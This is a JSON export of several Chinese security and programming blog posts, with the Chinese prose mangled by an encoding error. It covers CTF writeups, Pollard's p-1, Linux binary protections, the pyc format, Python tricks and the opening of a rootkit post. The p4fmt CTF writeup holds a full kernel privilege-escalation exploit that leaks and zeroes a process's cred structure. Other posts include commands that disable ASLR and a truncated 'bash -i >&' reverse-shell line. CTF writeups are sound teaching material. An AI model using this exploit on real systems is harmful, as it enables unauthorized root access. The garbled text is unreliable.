ç¬¬ä¸‰å¡Šå¾ $R$ å°åˆ°å¤§ åœ¨å¾ç¬¬ä¸€å¡Šè¦åˆ°ç¬¬äºŒå¡Šçš„æ™‚å€™ï¼Œ$R$ éƒ½æ˜¯å¤§çš„ åœ¨å¾ç¬¬äºŒå¡Šè¦åˆ°ç¬¬ä¸‰å¡Šçš„æ™‚å€™ï¼Œ$R$ éƒ½æ˜¯å°çš„ 123bool operator &lt; (const Q &amp;q) { return b == q.b ? (r &lt; q.r) ^ (b % 2) : b &lt; q.b;} é¡Œç›® Codeforces 86D - Powerful array http://sunmoon-template.blogspot.com/2015/08/mos-algorithm.html https://zhuanlan.zhihu.com/p/25017840 https://oi-wiki.org/misc/mo-algo/","link":"/2019/04/18/mo/"},{"title":"ã€CTF Writeupsã€‘TSG CTF 2019 - OPQRX","text":"Can you decrypt RSA? Iâ€™ll give a hint value, XOR. ã“ã“ã«RSAã®æš—å·æ–‡ãŒã‚ã‚Šã¾ã™ãŒã€XORã‚’ã‚ã’ã‚‹ã®ã§ã€ä»£ã‚ã‚Šã«å¹³æ–‡ã‚’ãã ã•ã„ã€‚ åˆ†æ•¸ è§£é¡Œäººæ•¸ 497 10 Writeups é¡Œç›®å¾ˆç°¡å–®ï¼ŒRSA åŠ å¯†ï¼Œå¤šçµ¦äº† $p \\oplus q$ çš„å€¼ $$ \\begin{align} &amp;p \\oplus q = x \\\\ &amp;p \\times q = n \\\\ \\end{align} $$ å·²çŸ¥ $x, n$ æ±‚ $p, q$ å‡è¨­ $x$ çš„ç¬¬ä¸€å€‹ bit æ˜¯ 0ï¼Œé‚£éº¼ $p, q$ çš„ç¬¬ä¸€å€‹ bit åªæœ‰ $(0, 0)$ æˆ– $(1, 1)$ å…©ç¨®å¯èƒ½ å‡è¨­ $x$ çš„ç¬¬ä¸€å€‹ bit æ˜¯ 1ï¼Œé‚£éº¼ $p, q$ çš„ç¬¬ä¸€å€‹ bit åªæœ‰ $(0, 1)$ æˆ– $(1, 0)$ å…©ç¨®å¯èƒ½ æ‰€ä»¥å°±ç›´æ¥çˆ†æœåŠ å‰ªæå°±éäº†ï¼Œé©šä¸é©šå–œï¼Œæ„ä¸æ„å¤– Final Exploit 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python3from Crypto.Util.number import *from tqdm import tqdmclass Solver: def __init__(self, x, n): self.x = x self.n = n self.pq = [(0, 0)] def add(self, b, p, q): if p * q &lt;= n and (p | (b - 1)) * (q | (b - 1)) &gt;= n: self.pq.append((p, q)) def solve(self): for shift in tqdm(range(4095, -1, -1)): b = 1 &lt;&lt; shift pq, self.pq = self.pq, [] for p, q in pq: if self.x &amp; b: self.add(b, p | b, q) self.add(b, p, q | b) else: self.add(b, p, q) self.add(b, p | b, q | b) return self.pq[0]exec(open('flag.enc').read().lower())solver = Solver(x, n)p, q = solver.solve()r = (p - 1) * (q - 1)d = inverse(e, r)m = pow(c, d, n)print(long_to_bytes(m)) Flag 1TSGCTF{Absolutely, X should be 'S' in 'OPQRX'.} https://furutsuki.hatenablog.com/entry/2019/05/05/163313#Crypto-497pts-10-Solves-OPQRX","link":"/2019/05/06/opqrx/"},{"title":"ã€CTF Writeupsã€‘Teaser Confidence CTF Quals 2019 - p4fmt","text":"Kernel challs are always a bit painful. No internet access, no SSH, no file copying. Youâ€™re stuck with copy pasting base64â€™d (sometimes static) ELFs. But what if there was another solution? Weâ€™ve created a lightweight, simple binary format for your pwning pleasure. Itâ€™s time to prove your skills. nc p4fmt.zajebistyc.tf 30002 åˆ†æ•¸ è§£é¡Œäººæ•¸ 304 10 Writeup é¡Œç›®æª”æ¡ˆè§£å£“ç¸®å¾Œæœ‰ä¸‰å€‹æª”æ¡ˆ bzImage, initramfs.cpio.gz, run.sh bzImage æ˜¯å£“ç¸®éçš„ linux kernel initramfs.cpio.gz æ˜¯è‡¨æ™‚çš„æª”æ¡ˆç³»çµ± run.sh è£¡é¢ç”¨ qemu-system-x86_64 æŠŠ kernel è·‘èµ·ä¾† ä¸ç†Ÿæ‚‰ linux kernel debug å¯ä»¥åƒè€ƒ Debug Kernel First Glance run.sh è·‘èµ·ä¾†å¾Œå°±æœƒè·‘ linux kernel å½ˆå‡ºä¸€å€‹ shell ls ä¸€ä¸‹å¯ä»¥çœ‹åˆ°ä¸‰å€‹æ¯”è¼ƒé‡è¦çš„æª”æ¡ˆ init, p4fmt.ko, flag ç›´æ¥å˜—è©¦ cat flag æœƒå¾—åˆ° Permission denied å› ç‚ºæˆ‘å€‘æ‹¿åˆ°çš„ä½¿ç”¨è€…æ˜¯ pwn è€Œ flag åªæœ‰ root æœ‰æ¬Šé™è®€ init è£¡é¢æœ‰ä¸€è¡Œ insmod /p4fmt.ko åŠ è¼‰ p4fmt.ko é€™å€‹å…§æ ¸æ¨¡å¡Š çœ‹ä¾†æˆ‘å€‘çš„ç›®æ¨™å°±æ˜¯åˆ©ç”¨ p4fmt.ko è£¡é¢çš„æ¼æ´ææ¬Šæ‹¿ root æ¬Šé™ï¼Œå°±å¯ä»¥ cat flag äº† å‰ç½®ä½œæ¥­ è§£å£“ initramfs.cpio.gz å¯ä»¥å…ˆç”¨ binwalk æŠŠ initramfs.cpio.gz çš„æª”æ¡ˆç³»çµ±æ‹‰å‡ºä¾† 12x initramfs.cpio.gzbinwalk -e initramfs.cpio ä¿®æ”¹ init 1setsid cttyhack su root ä¿®æ”¹ init è®“æˆ‘å€‘æœ‰ root æ¬Šé™ï¼Œé€™æ¨£æ‰çœ‹å¾—åˆ° p4fmt.ko å…§æ ¸æ¨¡å¡Šè¼‰å…¥å¾Œçš„ä½å€ï¼Œç­‰ç­‰æ‰æ–¹ä¾¿ä¸‹æ–·é» ä¿®æ”¹å®Œé‡æ–°æ‰“åŒ… initramfs.cpio.gz 1find . -print0 | cpio --null --create --format=newc | gzip --best &gt; ../initramfs.cpio.gz ä¿®æ”¹ run.sh 1-gdb tcp:127.0.0.1:6666 é–‹äº† gdb server å¾Œï¼Œå°±å¯ä»¥ç”¨ gdb é€£ä¸Šå» debug äº† é¦–å…ˆå…ˆå–å¾— p4fmt å…§æ ¸æ¨¡å¡Šçš„ä½å€ å¯ä»¥ç”¨ lsmod æˆ– cat /proc/modules ( å¿…é ˆæœ‰ root æ¬Šé™ ) gdb123(gdb) target remote :6666(gdb) add-symbol-file p4fmt.ko 0xffffffffc0288000(gdb) b load_p4_binary # é€™æ˜¯ p4fmt ä¸»è¦çš„å‡½å¼ç­‰ç­‰é€†å‘æœƒçœ‹åˆ° \"å–å¾— p4fmt ä½å€\"1234/ # lsmodp4fmt 16384 0 - Live 0xffffffffc0288000 (O)/ # cat /proc/modulesp4fmt 16384 0 - Live 0xffffffffc0288000 (O) é€†å‘ èµ·æ‰‹å¼ä¸€æ¨£ IDA æ‰“é–‹ ( å¥½åƒå¾ˆå¤šäººæ”¹ç”¨ ghidra äº† O_O ) ä½†æ˜¯é€™æ¬¡çš„åç·¨è­¯æœ‰é»ç³Ÿï¼Œå¤§éƒ¨åˆ†é‚„æ˜¯çœ‹çµ„èªé… gdb é€™å€‹å…§æ ¸æ¨¡å¡Šä¸»è¦çš„åŠŸèƒ½å°±æ˜¯è¨»å†Šä¸€å€‹æ–°çš„åŸ·è¡Œæª”æ ¼å¼ ( binary format ) 1234567int __init p4fmt_init (void) { _register_binfmt(&amp;p4format, 1);}void __exit p4fmt_init (void) { unregister_binfmt(&amp;p4format);} p4format æ˜¯ä¸€å€‹ linux_binfmt çš„çµæ§‹ 12345678struct linux_binfmt { struct list_head lh; struct module *module; int (*load_binary)(struct linux_binprm *); int (*load_shlib)(struct file *); int (*core_dump)(struct coredump_params *cprm); unsigned long min_coredump; /* minimal dump size */} __randomize_layout; å…¶ä¸­çš„ load_binary é€™å€‹æŒ‡æ¨™å°±æ˜¯æŒ‡å‘è² è²¬å»ºç«‹ç’°å¢ƒæŠŠç¨‹å¼è·‘èµ·ä¾†çš„å‡½å¼ è€Œåœ¨é€™è£¡å°±æ˜¯æŒ‡å‘ load_p4_binary é€™å€‹å‡½å¼ ( ä¸€èˆ¬çš„ ELF åŸ·è¡Œæª”æ˜¯ load_elf_binary ) 123int load_p4_binary (linux_binprm *bprm) { ...} linux_binprm æœƒå…ˆè®€æª”æ¡ˆçš„å‰ 128 bytes æ”¾é€² bprm-&gt;buf å› ç‚ºæœ‰é€™å€‹çµæ§‹æœ‰ __randomize_layoutï¼Œæ‰€ä»¥çµæ§‹æˆå“¡çš„é †åºæ˜¯éš¨æ©Ÿçš„ é€™é¡Œçš„ bprm-&gt;buf å¾ 0x48 é–‹å§‹ 128 bytesï¼Œå¯è¦‹ä¸‹åœ– ç¨‹å¼ä¸€é–‹å§‹æœƒå…ˆæª¢æŸ¥å‰å…©å€‹ bytes æ˜¯ä¸æ˜¯ P4 æ¥è‘—æª¢æŸ¥ç¬¬ä¸‰å€‹ byte æ˜¯ä¸æ˜¯ \\x00ï¼Œä¸æ˜¯çš„è©±æœƒå™´ Unknown version æ¥è‘—ç¬¬å››å€‹ byte å¯ä»¥æ˜¯ \\x00 æˆ– \\x01ï¼Œ\\x00 çš„è©±æœƒé€²ç°¡å–®çš„è·¯ç·šï¼Œ\\x01 æœƒé€²è¤‡é›œçš„è·¯ç·š æ¥è‘—å››å€‹ bytes ä»£è¡¨å¾Œé¢æœ‰å¹¾å€‹ mapping æ¥è‘—å…«å€‹ bytes ä»£è¡¨ mapping çš„é–‹é ­åœ¨ buf çš„ offset æ¥è‘—å…«å€‹ bytes æ“ºçš„æ˜¯ entry point çš„ä½å€ å…¶ä»–çš„éƒ¨åˆ†åŸºæœ¬ä¸Šè·Ÿ load_elf_binary ä¸€æ¨£ simple1vm_mmap(bprm-&gt;file, *(QWORD *)(bprm + 0x50), 0x1000, *(QWORD *)(bprm + 0x50) &amp; 7, 2, 0); complex123456789101112131415161718192021222324252627struct p4_mapping { long load_addr; long length; long offset;};int mapping_count = *(int *)(bprm-&gt;buf + 4);long mapping_offset = *(long *)(bprm-&gt;buf + 8);p4_mapping *mapping = bprm-&gt;buf + mapping_offset;for (int i = 0; i &lt; mapping_count; i++, mapping++) { long addr = mapping-&gt;load_addr &amp; 0xFFFFFFFFFFFFF000; long prot = mapping-&gt;load_addr &amp; 7; printk(&quot;vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\\n&quot;, addr, mapping-&gt;length, mapping-&gt;offset, prot); if (mapping-&gt;load_addr &amp; 8) { // é€™è£¡å°±æ˜¯è¦åˆå§‹åŒ–ä¸€æ®µè¨˜æ†¶é«”ï¼Œé¡ä¼¼ .bss æ®µ vm_mmap(0, addr, mapping-&gt;length, prot, 2, mapping-&gt;offset); printk(&quot;clear_user(addr=0x%llx, length=0x%llx)\\n&quot;, mapping-&gt;load_addr, mapping-&gt;length); _clear_user(mapping-&gt;load_addr, mapping-&gt;length); } else { // é€™è£¡æ˜¯è¦æŠŠæª”æ¡ˆæ›ä¸Šå»ï¼Œé¡ä¼¼ .text æ®µ vm_mmap(bprm-&gt;file, addr, mapping-&gt;length, prot, 2, mapping-&gt;offset); }} æ¼æ´ mapping_count æ”¹å¤§å¯ä»¥ leak linux_binprm å…¶ä»–æ¬„ä½çš„å€¼ _clear_user æ²’æœ‰æª¢æŸ¥ï¼Œå¯ä»¥æŠŠ kernel ä¸Šä»»æ„ä½å€çš„å€¼æ¸…ç©º linux_binprm æœ‰ä¸€å€‹ cred çš„çµæ§‹ï¼Œè£¡é¢å­˜çš„å°±æ˜¯ uid, gid æ‰€ä»¥æˆ‘å€‘åªè¦ leak å‡ºé€™å€‹ cred çš„ä½å€ï¼Œç„¶å¾Œç”¨ _clear_user æ¸…æˆ 0ï¼Œæˆ‘å€‘çš„ç¨‹å¼å°±æ˜¯ root æ¬Šé™äº† ( root çš„ uid æ˜¯ 0 ) å˜—è©¦ 1234567891011121314151617181920212223#!/usr/bin/env python3from pwn import *from base64 import b64encodecontext.arch = &quot;amd64&quot;payload = b&quot;P4&quot; # magicpayload += p8(0) # versionpayload += p8(1) # typepayload += p32(1) # mapping_countpayload += p64(0x18) # mapping_offsetpayload += p64(0x400030) # entry# mappingpayload += flat( 0x400000 | 7, 0x1000, 0)payload += asm(shellcraft.echo(&quot;test\\n&quot;) + shellcraft.exit())print(f'echo {b64encode(payload).decode()} | base64 -d &gt; a ; chmod +x a ; ./a') å…ˆå¯«å€‹ç°¡å–®çš„ p4 æ ¼å¼çš„åŸ·è¡Œæª”æ¸¬è©¦ä¸€ä¸‹æˆ‘å€‘çš„ç†è§£æ˜¯ä¸æ˜¯å°çš„ command1echo UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU= | base64 -d &gt; a ; chmod +x a ; ./a output12[50353.170813] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)test æ¥ä¸‹ä¾†è¦æ‰¾ cred çš„ä½å€ï¼Œå› ç‚º pwn çš„ uid æ˜¯ 1000 ( = 0x3e8 ) æ‰€ä»¥æˆ‘å€‘æŠŠä½¿ç”¨è€…åˆ‡æ›æˆ pwnï¼Œåˆ‡æˆ pwn ä¹‹å¾Œè¦åœ¨ /tmp æ‰å¯ä»¥å¯«æª” ç„¶å¾ŒæŠŠ mapping_count æ”¹å¤§ä¸€é»ï¼Œæ¯”å¦‚ 6ï¼Œåœ¨ä»–å°å‡ºçš„ä½å€æŒ‡å‘çš„å€¼ä¸­æ‰¾ 0x3e8 12345678[50800.668734] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)[50800.674080] vm_mmap(load_addr=0x10101010101b000, length=0x726475b848500101, offset=0x431480101010b75, prot=0)[50800.674550] clear_user(addr=0x10101010101b848, length=0x726475b848500101)[50800.675372] vm_mmap(load_addr=0x6a5f016a58016000, length=0x6a050fe689485a05, offset=0x50f583c, prot=4)[50800.675786] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)[50800.676003] vm_mmap(load_addr=0x0, length=0x7fffffffef99, offset=0x100000001, prot=0)[50800.676260] vm_mmap(load_addr=0x0, length=0xffffa1c307595b40, offset=0x0, prot=0)test æ‰¾äº†ä¸€æ‰¾ç™¼ç¾åœ¨ç¬¬å…­å€‹ vm_mmap çš„ 0xffffa1c307595b40 é€™å€‹ä½å€æ˜¯ cred ä½†æ˜¯é€™å€‹ä½å€æ¯æ¬¡è·‘èµ·ä¾†éƒ½ä¸ä¸€æ¨£ï¼Œä¸éå¤šè·‘å¹¾æ¬¡æœƒç™¼ç¾ï¼Œé€™å€‹å€¼æœƒä¸€ç›´å¾ªç’°é‡è¤‡åˆ©ç”¨ï¼Œæ‰€ä»¥åªè¦å¤šè·‘å¹¾æ¬¡å°±æœƒå°äº† Final Exploit 1234567891011121314151617181920212223242526272829#!/usr/bin/env python3from pwn import *from base64 import b64encodecontext.arch = &quot;amd64&quot;payload = b&quot;P4&quot; # magicpayload += p8(0) # versionpayload += p8(1) # typepayload += p32(2) # mapping_countpayload += p64(0x18) # mapping_offsetpayload += p64(0x400048) # entryleak_cred = 0xffff9855c758c0c0# mappingpayload += flat( 0x400000 | 7, 0x1000, 0, (leak_cred | 8) + 0x10, 0x20, 0)payload += asm(shellcraft.cat(&quot;/flag&quot;) + shellcraft.exit())print(f'echo {b64encode(payload).decode()} | base64 -d &gt; a ; chmod +x a ; ./a') https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/","link":"/2019/04/26/p4fmt/"},{"title":"ã€æ¼”ç®—æ³•ç­†è¨˜ã€‘Pollard&#39;s p - 1 Algorithm","text":"æœ‰ä¸€å€‹åˆæ•¸ $n$ï¼Œæœ‰ä¸€å€‹è³ªå› æ•¸ $p$ Pollardâ€™s p - 1 algorithm å¯ä»¥åœ¨ $p-1$ çš„æœ€å¤§è³ªå› æ•¸å¾ˆå°çš„æƒ…æ³ä¸‹ï¼Œæœ‰æ•ˆçš„åˆ†è§£åˆæ•¸ $n$ å¯ä»¥ç”¨åœ¨åˆ†è§£ RSA ç”¢ç”Ÿçš„å…¬é‘° $n$ï¼Œä»¥æ­¤ç ´è§£ RSAï¼Œå¸¸è¦‹æ–¼ä¸€äº› CTF çš„é¡Œç›®ä¸­ æ ¹æ“šè²»é¦¬å°å®šç† ç•¶ $a$ ä¸æ˜¯ $p$ çš„å€æ•¸ $a^{p-1} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} - 1 \\equiv 0 \\pmod{p}$ for some $k$ æ‰€ä»¥ $gcd(a^{k(p-1)} - 1, n)$ ä¸€å®šæœƒæ˜¯ $p$ çš„å€æ•¸ Pollardâ€™s p - 1 algorithm å°±æ˜¯å˜—è©¦å»æ§‹é€ å‡º $k(p-1)$ ï¼Œä¸¦ä¸”ä»¤ $a = 2$ ( åªè¦ $p \\ne 2$ ä¸Šé¢çš„æ¨è«–å°±æ˜¯å°çš„ ) ä¹Ÿå°±æ˜¯æ¸¬è©¦ $gcd(2^{1} - 1, n), gcd(2^{1 \\times 2} - 1, n), gcd(2^{1 \\times 2 \\times 3} - 1, n), â€¦$ ç•¶ $1 \\times 2 \\times 3 \\cdots$ æ˜¯ $p-1$ çš„å€æ•¸ï¼Œæˆ‘å€‘å°±æˆåŠŸåˆ†è§£ $n$ ä½¿ç”¨æ¢ä»¶ ç•¶ $p-1$ æœ€å¤§çš„è³ªå› æ•¸å¾ˆå°ï¼Œå¯ä»¥æœ‰æ•ˆçš„åˆ†è§£åˆæ•¸ $n$ ç¨‹å¼ç¢¼ ( python ) 123456789import mathdef pollard(n): a, b = 2, 2 while True: a, b = pow(a, b, n), b + 1 d = math.gcd(a - 1, n) if 1 &lt; d &lt; n: return d","link":"/2018/02/22/pollard/"},{"title":"ã€æŠ€è¡“ç­†è¨˜ã€‘Linux ç¨‹åºä¿è­·æ©Ÿåˆ¶","text":"RELRO (RELocation Read Only) RELRO èªªæ˜ gcc ç·¨è­¯åƒæ•¸ No GOT writable, link_map writable gcc -Wl,-z,norelro code.c Partial GOT writable, link_map readonly DEFAULT Full GOT read only, no link_map and dl_resolver pointer gcc -Wl,-z,relro,-z,now code.c CANARY stack overflow - gcc generate canary or not Canary gcc ç·¨è­¯åƒæ•¸ Enable DEFAULT (when buffer large enough) Disable gcc -fno-stack-protector code.c NX (No-Execute) / DEP (Data Execution Prevention) å¯ä»¥å¯«çš„åœ°æ–¹ä¸èƒ½åŸ·è¡Œ NX / DEP gcc ç·¨è­¯åƒæ•¸ execstack Enable DEFAULT execstack -s code Disable gcc -z execstack code.c execstack -c code ASLR (Address Space Layout Randomization) Configuring ASLR with randomize_va_space 1230 - è¡¨ç¤ºé—œé–‰é€²ç¨‹åœ°å€ç©ºé–“éš¨æ©ŸåŒ–ã€‚1 - è¡¨ç¤º mmap, stack, vdso éš¨æ©ŸåŒ–ã€‚2 - è¡¨ç¤ºæ¯” 1 å¤šäº† heap éš¨æ©ŸåŒ–ã€‚ 12sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_spacesudo sysctl -w kernel.randomize_va_space=0 PIE (Position Independent Executables) PIE gcc ç·¨è­¯åƒæ•¸ Enable gcc -fpie -pie code.c Disable DEFAULT FRAME POINTER æœ‰é–‹çš„è©±æ˜¯ 12leaveret æ²’é–‹çš„è©±æ˜¯ 12add rsp, 0x18ret Canary gcc ç·¨è­¯åƒæ•¸ Enable DEFAULT Disable gcc -fomit-frame-pointer code.c checksec checksec æ˜¯ä¸€å€‹ç”¨ä¾†æŸ¥çœ‹ä¸Šè¿°æ‰€èªªçš„ä¿è­·æ©Ÿåˆ¶çš„ bash script 12RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEFull RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH 65 Symbols No 0 1 ./hello pwntools ä¹Ÿæœ‰å…§å»ºä¸€å€‹åå­—å’ŒåŠŸèƒ½éƒ½ä¸€æ¨£çš„æŒ‡ä»¤ 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled","link":"/2019/03/21/protection/"},{"title":"ã€æŠ€è¡“ç­†è¨˜ã€‘pyc èˆ‡ä»–å€‘çš„ç”¢åœ°","text":"pyc æ ¼å¼ å‰ 8 bytes æ˜¯ magic numberï¼Œä¸åŒçš„ python çš„ç‰ˆæœ¬æœƒæœ‰ä¸åŒçš„ magic numberï¼Œåƒè€ƒ /python/cpython/Lib/importlib/_bootstrap_external.py æˆ– /google/pytype/blob/master/pytype/pyc/magic.py æ¥ä¸‹ä¾† 8 bytes æœƒæ˜¯ pyc è¢«ç”¢ç”Ÿå‡ºä¾†çš„æ™‚é–“æˆ³è¨˜ å‰©ä¸‹çš„éƒ½æ˜¯åºåˆ—åŒ–çš„ PyCodeObject ( marshal.dumps çš„çµæœ ) python2python2 çš„ magic number å’Œæ™‚é–“æˆ³è¨˜éƒ½æ˜¯ 4 bytes ç·¨è­¯ pyc import import å…¶ä»–çš„ python ç¨‹å¼çš„æ™‚å€™ï¼ŒæœƒæŠŠè¢«å¼•å…¥çš„ç¨‹å¼ç·¨è­¯æˆ .pyc æ”¾åˆ° __pycache__ è³‡æ–™å¤¾ é€™æ¨£å¯ä»¥æ¸›å°‘å¼•å…¥çš„æ™‚é–“ py_compile 12import py_compilepy_compile.compile('test.py') å°±æœƒç”Ÿæˆ .pyc æª”åœ¨ __pycache__ è³‡æ–™å¤¾ compileall 1python -m compileall . å¯ä»¥ä¸€æ¬¡ compile è³‡æ–™å¤¾å…§æ‰€æœ‰æª”æ¡ˆ åç·¨è­¯ pyc è¦ decompile pyc å¯ä»¥ä½¿ç”¨ uncompyle6 æˆ– decompyle3 æˆ– pycdc ä½†æ˜¯æ³¨æ„åˆ° uncompyle6 å° 3.6 ç‰ˆä»¥ä¸Šçš„æ”¯æ´æ²’æœ‰å¾ˆå¥½ï¼Œå¯ä»¥çœ‹ é€™å€‹ issueï¼Œä½œè€…æ²’éŒ¢æ‹¿ä¹Ÿç´¯äº†ï¼Œè€Œä¸”æ–°ç‰ˆæœ¬åˆå¤šäº†æ–°æ±è¥¿ï¼Œcfg æ›´é›£åˆ†æï¼Œæ‰€ä»¥ fork å‡ºå»äº† decompyle3 è©¦åœ–é‡æ–°æ•´ç†ä¸¦è§£æ±ºå•é¡Œã€‚ 1uncompyle6 test.pyc 1234567891011# uncompyle6 version 3.3.2# Python bytecode 3.7 (3394)# Decompiled from: Python 3.7.0 (default, Oct 9 2018, 16:58:41)# [GCC 5.4.0 20160609]# Embedded file name: /home/oalieno/lib.py# Size of source mod 2**32: 23 bytesdef f(x): return x# okay decompiling lib.cpython-37.pyc marshal &amp; dis 123456789101112131415import marshalimport dis# PyCodeObjectcode = marshal.loads(open('test.pyc', 'rb').read()[16:])code = compile('x = 1', 'filename', 'exec')# bytecodecode.co_code# disassemble PyCodeObject (with line number and some meta data)dis.dis(code)# disassemble bytecode (directly)dis.dis(code.co_code) ç”¨çœ¼ç›çœ‹ marshal dumps data å¯ä»¥åƒè€ƒ marshal.cï¼Œæ ¼å¼éƒ½æ˜¯ä¸€å€‹ byte çš„ type åŠ ä¸Šå¾Œé¢ä¸€æ®µ dataï¼Œä¸»è¦çš„ç¨‹å¼ç¢¼åœ¨é€™è£¡ marshal.c line 953ï¼Œé€™è£¡çš„ r_object å˜—è©¦å»è®€ä¸€å€‹ object é€²ä¾†ï¼Œè£¡é¢å°±ç”¨ switch case å»è™•ç†ä¸åŒçš„ typeã€‚ æ¯”å¦‚ TYPE_INT å°±æ˜¯ç”¨ r_long å»è®€ 4 å€‹ bytes çš„ long é€²ä¾†ï¼Œæ‰€ä»¥ marshal.dumps(1) å°±æœƒé•·å¾—åƒ b'\\xe9\\x01\\x00\\x00\\x00'ï¼Œå‰é¢çš„ type æœ‰æ™‚å€™æœƒè¢« | 0x80ï¼Œè«‹çœ‹ marshal.c line 223ï¼Œæ‰€ä»¥ 0xe9 &amp; (0x80 - 1) = ord('i')ã€‚ å¦ä¸€å€‹åƒæ˜¯ TYPE_CODE å°±å…ˆ r_long äº†å…­æ¬¡ï¼Œè®€äº† argcount, posonlyargcount, kwonlyargcount, ... é€²ä¾†ï¼Œæ¥ä¸‹ä¾†æ‰ç”¨ r_object æŠŠ code è®€é€²ä¾† ( ä¹Ÿå°±æ˜¯ bytecode )ï¼Œè®€é€²ä¾†çš„ object å…¶å¯¦æ˜¯ bytes å‹æ…‹ï¼Œä¹Ÿå°±æ˜¯ bytecode æ˜¯ç”¨ bytes å‹æ…‹å­˜åœ¨ code object è£¡é¢çš„ï¼Œæ¥ä¸‹ä¾†å†ç¹¼çºŒæŠŠä¸€äº› consts, names, varnames, ... è®€é€²ä¾†ã€‚ https://docs.python.org/3/library/dis.html http://unpyc.sourceforge.net/Opcodes.html https://kdr2.com/tech/main/1012-pyc-format.html https://late.am/post/2012/03/26/exploring-python-code-objects.html","link":"/2019/06/07/pyc/"},{"title":"ã€ç¨‹å¼èªè¨€ã€‘Python çš„å¥‡æ·«æŠ€å·§","text":"åˆ—äº†ä¸€äº›æˆ‘æ–°ç™¼ç¾çš„å„ç¨®èŠ±æ‹› Function Attributes (python 2.1) PEP 232 123456789def a(): a.count += 1a.count = 0for i in range(10): a()print(a.count) # 10 è·Ÿ C++ ä¸­ï¼Œåœ¨ function è£¡é¢å®£å‘Š static è®Šæ•¸å·®ä¸å¤š Keyword-Only Arguments (python 3.0) PEP 3102 12def func(a, b, *, c = None): pass func(1, 2, 3) ä¸è¡Œ func(1, 2, c = 3) é€™æ¨£æ‰åˆæ³• Additional Unpacking Generalizations (python 3.5) PEP 448 123a = [1, 2, 3]b = [*a, 4, 5]print(b) # [1, 2, 3, 4, 5] Merge Dicts 1234a = {1: 2}b = {3: 4}c = {**a, **b}print(c) # {1: 2, 3: 4} Metaclasses Python Metaclasses 12345678910111213class A: passB = type('B', (A,), { 'attr': 10, 'func': lambda obj: obj.attr })b = B()print(b.attr) # 10print(b.func()) # 10 æ­£å¸¸å¯«æ³•1234567891011class A: passclass B(A): attr = 10 def func(self): return self.attrb = B()print(b.attr) # 10print(b.func()) # 10 çœ‹çœ‹å°±å¥½xD shallow vs deep copy Shallow vs Deep Copying of Python Objects assign12345678910a = [[1, 2, 3], [4, 5, 6]]b = ab.append('hello')b[0].append('world')print(a)# [[1, 2, 3, 'world'], [4, 5, 6], 'hello']print(b)# [[1, 2, 3, 'world'], [4, 5, 6], 'hello'] copy123456789101112import copya = [[1, 2, 3], [4, 5, 6]]b = copy.copy(a)b.append('hello')b[0].append('world')print(a)# [[1, 2, 3, 'world'], [4, 5, 6]]print(b)# [[1, 2, 3, 'world'], [4, 5, 6], 'new object'] deepcopy123456789101112import copya = [[1, 2, 3], [4, 5, 6]]b = copy.deepcopy(a)b.append('hello')b[0].append('world')print(a)# [[1, 2, 3], [4, 5, 6]]print(b)# [[1, 2, 3, 'world'], [4, 5, 6], 'new object'] copy.copy (shallow) åªè¤‡è£½è©²ç‰©ä»¶ï¼Œä¸æœƒè¤‡è£½å­ç‰©ä»¶ copy.deepcopy (deep) æœƒéè¿´è¤‡è£½æ‰€æœ‰å­ç‰©ä»¶ shallow copy on list 12a = [1, 2, 3]b = list(a) 12a = [1, 2, 3]b = a[:] 12a = [1, 2, 3]b = a.copy() 1234import copya = [1, 2, 3]b = copy.copy(a) annotations PEP 3107 PEP 526 function annotations 12345def func(a: int, b: list) -&gt; int: passprint(func.__annotations__)# {'a': &lt;class 'int'&gt;, 'b': &lt;class 'list'&gt;, 'return': &lt;class 'int'&gt;} class annotations 12345class A(): var: intprint(A.__annotations__)# {'var': &lt;class 'int'&gt;} variable annotations 12345a: intb: int = 2print(__annotations__)# {'a': &lt;class 'int'&gt;, 'b': &lt;class 'int'&gt;} intern string 12s = 'hello's = sys.intern(s) æŠŠå­—ä¸²å­˜é€²å¿«å–æ± ï¼Œç›¸åŒçš„å­—ä¸²åªæœƒå­˜ä¸€æ¬¡ åšå­—ä¸²æ¯”å°æœƒæ¯”è¼ƒå¿«ä¸”ç¯€çœç©ºé–“ http://guilload.com/python-string-interning/ http://www.laurentluce.com/posts/python-string-objects-implementation/","link":"/2019/01/06/python-tricks/"},{"title":"ã€æŠ€è¡“ç­†è¨˜ã€‘ROOTKIT éš±è—ç¨‹åºæŠ€å·§","text":"ç°¡å ±ç‰ˆæœ¬ : https://www.slideshare.net/ssuserd44fa2/rootkit-101-228943978 root + kit çš„æ„æ€å°±æ˜¯æ‹¿åˆ° root æ¬Šé™å¾Œå¯ä»¥ç”¨çš„å·¥å…·åŒ…ï¼Œå¤§å¤šæ˜¯éš±è—ç¨‹åºçš„æŠ€å·§ï¼Œæ‰€ä»¥ rootkit ä¹Ÿå¯ä»¥ç†è§£æˆéš±è—ç¨‹åºæŠ€è¡“çš„é€šç¨±ï¼Œä¸éä¹Ÿæœ‰äº›ä¸éœ€è¦ root çš„éš±è—ç¨‹åºæŠ€è¡“ï¼Œä»Šå¤©æœƒé€ä¸€ä»‹ç´¹ linux ä¸Š rootkit çš„åŸç†èˆ‡å¯¦ä½œ éš±ä¹‹å‘¼å¸å£¹ä¹‹å‹ - PATH Hijack æ¢ä»¶ ä¸éœ€è¦ root ç›®æ¨™ åœ¨ ps çš„çµæœä¸­éš±è—ä¸‹é¢å…©ç¨®ç°¡å–®çš„å¾Œé–€ bash -i &gt;&amp; 